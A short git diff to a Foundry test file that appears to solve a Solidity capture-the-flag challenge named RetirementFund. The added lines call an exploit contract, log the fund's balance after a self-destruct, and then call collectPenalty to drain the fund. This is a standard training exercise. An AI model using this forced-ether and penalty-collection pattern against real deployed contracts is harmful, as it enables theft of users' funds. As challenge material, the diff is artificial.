@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/RetirementFund.sol";
+import {console2} from "forge-std/console2.sol";
 
 contract RetirementFundTest is Test {
     RetirementFund public retirementFund;
@@ -19,6 +20,12 @@ contract RetirementFundTest is Test {
         // Test your Exploit Contract below
         // Use the instance retirementFund and exploitContract
 
+        // test contract is player / beneficiary
+
+        exploitContract.exploit();
+        console2.log("after self destruct");
+        console2.log(address(retirementFund).balance);
+        retirementFund.collectPenalty();
         // Put your solution here
 
         _checkSolved();
